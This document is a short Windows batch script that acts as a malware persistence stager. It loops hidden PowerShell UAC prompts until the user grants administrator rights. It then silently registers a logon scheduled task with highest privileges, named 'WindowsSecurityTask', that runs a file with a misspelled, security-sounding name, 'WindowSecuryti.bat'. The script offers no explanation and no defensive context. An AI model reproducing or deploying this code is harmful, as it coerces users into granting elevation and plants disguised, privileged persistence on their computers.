@echo off
setlocal enabledelayedexpansion
set FLAGFILE=%TEMP%\admin.ok
net session >nul 2>&1
if %errorlevel% == 0 (
    > "%FLAGFILE%" echo.
    goto afterAdmin
)
if "%~1" neq "elevated" (
:askUAC
    del "%FLAGFILE%" >nul 2>&1
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList elevated -Verb RunAs"
    timeout /t 1 /nobreak >nul
    if exist "%FLAGFILE%" (
        del "%FLAGFILE%" >nul 2>&1
        goto afterAdmin
    )
    goto askUAC
)
exit /b

:afterAdmin

schtasks /create /tn "WindowsSecurityTask" /tr "\"%LOCALAPPDATA%\WindowSecuryti.bat\"" /sc onlogon /rl highest /f >nul 2>&1
